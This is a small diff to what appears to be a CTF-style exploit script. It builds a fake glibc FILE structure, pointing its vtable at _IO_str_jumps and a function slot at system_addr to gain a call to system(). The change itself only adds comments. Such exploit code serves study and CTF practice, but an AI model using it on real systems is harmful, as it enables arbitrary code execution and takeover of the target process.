@@ -92,9 +92,9 @@ stream = stream.ljust(0xc0,"\x00")
 stream += p64(0) # mode<=0
 stream += p64(0)
 stream += p64(0)
-stream += p64(_IO_str_jumps)
+stream += p64(_IO_str_jumps)   # vtable
 stream = stream.ljust(0xe0,"\x00")
-stream +=p64(system_addr)
+stream +=p64(system_addr)   # call system
 
 payload = pad + stream
 
